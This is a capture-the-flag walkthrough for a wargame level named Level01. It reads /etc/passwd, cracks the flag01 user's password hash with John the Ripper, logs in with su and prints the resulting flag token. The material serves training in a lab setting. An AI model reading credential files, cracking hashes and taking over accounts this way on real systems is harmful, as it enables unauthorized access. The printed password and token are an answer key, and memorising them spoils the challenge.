# Level01 Walkthrough

## Objective

Gain access to `flag01` and retrieve the token.

## Steps

### 1. Locate the hashed password

```bash id="a1k2mz"
cat /etc/passwd
```

Output:

```id="b9x4qp"
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

### 2. Save the hash to a file

```bash id="c8v3rt"
echo "42hDRfypTqqnw" > hash.txt
```

### 3. Crack the hash using John the Ripper

```bash id="d5n7ls"
john hash.txt
```

Result:

```id="e2y8uk"
abcdefg
```

### 4. Switch user

```bash id="f6w1zo"
su flag01
```

**Password:**

```id="g3h9xd"
abcdefg
```

### 5. Retrieve the flag

```bash id="h4j2pl"
getflag
```

## Token

```id="i7q0mn"
f2av5il02puano7naaf6adaaf
```

